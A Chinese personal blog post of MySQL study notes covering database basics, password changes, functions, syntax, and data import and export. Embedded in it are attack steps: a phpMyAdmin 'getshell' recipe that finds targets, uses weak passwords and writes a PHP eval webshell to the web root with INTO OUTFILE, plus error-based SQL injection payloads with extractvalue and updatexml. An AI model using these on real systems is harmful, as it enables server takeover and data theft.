<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">mysql基础学习</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2018-12-23</span><br><br></div><section id="articleDiv"><p></p><p>前言:对数据库特别是mysql的学习</p><p></p>
<p></p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一个用来存放数据的服务或者平台，要么以结构化(数据库、表、数据)形式存放，要么以非结构化(key=value)形式存储。</p><p></p>
<p></p><p>学生库(stu_db) –&gt;学生表(stu_table) –&gt;id、name、number、class<br>                1    zhang    21100      97<br>student.txt<br>id=1<br>name=zhang<br>number=21100<br>class=95</p><p></p>
<p></p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>mysql(轻量级开源数据库，适用于中小型企业，性能较好)、SQL server(微软开发、适用于中大型企业，需要微软系统作为支撑、不支持跨平台)、Oracle(收费、适用于大型企业需求、支持跨平台、需要良好的硬件平台)</p><p></p>
<p></p><h3 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h3><p>关系型数据库(结构化)mysql/mssql/oracle/DB2</p><p></p>
<p></p><p>非关系型数据库(非结构化)redis/mongodb/hbase/nosql</p><p></p>
<p></p><h3 id="mysql设置环境变量"><a href="#mysql设置环境变量" class="headerlink" title="mysql设置环境变量"></a>mysql设置环境变量</h3><p>phpstudy修改mysql密码</p><p></p>
<p></p><p>dos登录mysql</p><p></p>
<p></p><p>mysql交互式窗口</p><p></p>
<p></p><p>mysql-front 开源的数据库管理器</p><p></p>
<p></p><p>phpadmin 基于网页的数据库管理器</p><p></p>
<p></p><p>mysql默认端口3306</p><p></p>
<p></p><p>打开数据库管理器，数据库–&gt;数据表–&gt;字段名(表头)</p><p></p>
<p></p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码:"></a>修改密码:</h3><p>低版本(5.x)<br>    update mysql.user set<br>    authentication_string=password(‘root’),plugin=’mysql_native_password’ where user=’root’ and     host=’localhost’;<br>    flush privileges;</p><p></p>
<pre><code>高版本
ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED  BY &quot;你的新密码&quot;;
flush privileges;
</code></pre><h3 id="mysql外联"><a href="#mysql外联" class="headerlink" title="mysql外联"></a>mysql外联</h3><p>1.改表法<br>    use mysql; //选择mysql数据库</p>
<pre><code>update user set host = ‘%’ where user =‘root’ and host=‘localhost’;//修改数据表

重启mysql

关闭防火墙
</code></pre><h3 id="mysql的基本函数"><a href="#mysql的基本函数" class="headerlink" title="mysql的基本函数"></a>mysql的基本函数</h3><p>select version();</p>
<p>select user();当前用户</p>
<p>select mid() 用来截取字符串中的一部分</p>
<p>select ord()用来显示字符ascii码</p>
<p>select concat() 拼接字符串</p>
<p>**select concat_ws() 使用分隔符来拼接(sql注入常用)</p>
<p>select group_concat() 和concat类似</p>
<p>select database()/schema() 查看当前数据库</p>
<p>select @@hostname; 计算机名</p>
<p>select @@tmpdir;</p>
<p>select @@datadir;存放数据的地方</p>
<p>select @@version;版本</p>
<p>select @@basedir；数据库所在位置</p>
<p>select connection_id(); 用户连接数</p>
<p>select insert(‘yuanlaide’ 1,2,’xinde’);</p>
<p>select left(‘asdas’,4);(向左截)</p>
<p>select right(‘asdas’,4);被截取的字符串，截取的长度(向右截)</p>
<p>select substring()/mid()/substr()都是三个参数;被截取的字符串，开始位置，截取长度。</p>
<p>select sleep(5);  数据库等待5s返回0</p>
<h3 id="mysql语法"><a href="#mysql语法" class="headerlink" title="mysql语法"></a>mysql语法</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库:"></a>创建数据库:</h4><pre><code>mysqladmin -uroot -proot create test;
</code></pre><h4 id="删除数据库-drop"><a href="#删除数据库-drop" class="headerlink" title="删除数据库(drop)"></a>删除数据库(drop)</h4><h4 id="使用数据库-use"><a href="#使用数据库-use" class="headerlink" title="使用数据库(use)"></a>使用数据库(use)</h4><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>int    float   date   time   timestamp   char   varchar   text</p>
<h4 id="查看表头"><a href="#查看表头" class="headerlink" title="查看表头"></a>查看表头</h4><pre><code>DESC 表名
show create table 表名
</code></pre><p>if not exists</p>
<p>select 字段名1，字段名2，…字段名n from 表名 limit 0,1 ;limit用来限制读取记录,0是索引,1是记录数</p>
<h4 id="like子句"><a href="#like子句" class="headerlink" title="like子句"></a>like子句</h4><ul>
<li>表示任意的字符</li>
</ul>
<p>% 表示任意的字符</p>
<p>? 表示一个字符</p>
<p>select * from stu where 字段名 like ‘字符串’;   字符串可以有通配符</p>
<h4 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h4><p>select <em> from 表1 union select </em> from 表2;<br>表1和表2字段个数要相等</p>
<p>oreder by 条件    根据条件排序   asc升序  desc降序</p>
<p>oreder by 数字    按照对第n列的数字进行排序，如果n超过数据表的列数就会报错。</p>
<p>group by  对结果进行分组，和count,sum,avg等函数一起使用。</p>
<p>删除字段  alter table 表名 drop 字段名。</p>
<p>增加字段alter table 表名 add 字段名 字段类型。</p>
<p>修改字段类型alter table 表名 modify 字段名 字段类型。</p>
<p>修改表名alter table 原表名 rename to 新表名。</p>
<h4 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h4><pre><code>mysql -u用户名 -p密码  &lt;  要导入的数据库数据 

如果数据库不会自动创建

source  要导入的数据库数据

mysqlimport  -uroot -p  --local database_name  dump.txt
</code></pre><h4 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h4><pre><code>select * from  表名 into outfile 文件

通过phpmyadmin来获取服务器权限(getshell)

1.通过google hacker 找到phpadmin的网站

2.弱口令登录，show global variables like &apos;%secure_file_priv%&apos;;判断有没有权限去写木马文件

3.select &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;/var/www/html&apos;; 木马路径

secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。

secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。

secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。
临时改变:set global secure_file_priv=&apos;&apos;;

mysqldump -uroot -proot 数据库名  表名&gt; ./data.sql
</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>井号 (%23)</p>
<p>__</p>
<p>/<em> </em>/</p>
<h4 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h4><pre><code>extractvalue(XML_document，XPath_string):

select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));

UPDATEXML (XML_document, XPath_string, new_value);

select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
</code></pre><h4 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h4><pre><code>select distinct 字段名 from 表名

group_concat把查询结果链接一起

select  group_concat(distinct 字段名) from 表名 where;
</code></pre></section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>